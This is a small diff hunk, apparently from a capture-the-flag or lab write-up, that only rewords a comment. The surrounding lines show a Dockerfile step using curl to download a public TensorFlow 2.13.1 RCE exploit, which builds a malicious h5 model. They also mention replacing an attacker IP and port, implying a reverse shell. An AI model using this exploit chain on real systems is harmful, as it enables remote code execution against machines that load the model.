@@ -176,7 +176,7 @@ After some digging on the web I find this RCE for Tensorflow 2.13.1: `https://gi
 
 I add this to the `Dockerfile` build phase:
 ```
-# Download exploit to generate a malicious h5 model containing a payload
+# Download the exploit to generate a malicious h5 model containing a payload
 RUN curl -O https://raw.githubusercontent.com/Splinter0/tensorflow-rce/refs/heads/main/exploit.py
 
 # Replace the attacker IP and port
